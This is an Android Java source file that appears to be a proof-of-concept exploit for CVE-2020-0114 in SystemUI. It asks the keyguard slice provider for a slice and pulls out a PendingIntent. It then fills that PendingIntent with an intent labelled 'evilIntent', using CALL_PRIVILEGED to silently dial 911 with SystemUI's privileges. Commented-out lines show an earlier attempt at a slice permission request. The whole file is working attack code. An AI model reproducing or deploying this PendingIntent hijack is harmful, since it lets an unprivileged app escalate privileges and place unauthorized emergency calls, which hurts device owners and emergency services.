package com.example.cve_2020_0114_systemui;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.app.PendingIntent;
import android.app.slice.Slice;
import android.app.slice.SliceProvider;
import android.app.slice.SliceSpec;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcelable;
import android.util.Log;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {
//    final static String uriKeyguardSlices = "content://com.android.systemui.keyguard";
    final static String uriKeyguardSlices = "content://com.android.systemui.keyguard";



    @RequiresApi(api = Build.VERSION_CODES.P)
    private Bundle prepareReqBundle() {
        Bundle b = new Bundle();
        b.putParcelable("slice_uri", Uri.parse(uriKeyguardSlices));
        ArrayList<Parcelable> supportedSpecs = new ArrayList<Parcelable>();
        supportedSpecs.add(new SliceSpec("androidx.app.slice.LIST", 1));
        supportedSpecs.add(new SliceSpec("androidx.slice.LIST", 1));
        supportedSpecs.add(new SliceSpec("androidx.app.slice.BASIC", 1));
        b.putParcelableArrayList("supported_specs", supportedSpecs);
        return b;
    }




    @RequiresApi(api = Build.VERSION_CODES.P)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
//        Bundle responseBundle = getContentResolver().call(Uri.parse(uriKeyguardSlices), "bind_slice", null, prepareReqBundle());
//        Slice slice = responseBundle.getParcelable("slice");
//        Log.d("pi", slice.toString());

        setContentView(R.layout.activity_main);
//        Intent intent = new Intent("com.android.intent.action.REQUEST_SLICE_PERMISSION");
//        intent.setComponent(new ComponentName("com.android.systemui","com.android.systemui.SlicePermissionActivity"));
//        Uri uri= Uri.parse(uriKeyguardSlices);
//        intent.putExtra("slice_uri",uri);
//        intent.putExtra("pkg",getPackageName());
//        intent.putExtra("provider_pkg","com.android.systemui");
//        startActivity(intent);

        Bundle responseBundle = getContentResolver().call(Uri.parse(uriKeyguardSlices), "bind_slice", null, prepareReqBundle());

        Slice slice = responseBundle.getParcelable("slice");
        Log.d("pi", slice.toString());
        PendingIntent pi = slice.getItems().get(2).getSlice().getItems().get(0).getAction();
        Intent evilIntent = new Intent("android.intent.action.CALL_PRIVILEGED");
        evilIntent.setData(Uri.parse("tel:911"));
        try {
            pi.send(getApplicationContext(), 0, evilIntent, null, null);
        } catch (PendingIntent.CanceledException e) {
            e.printStackTrace();
        }





























    }


}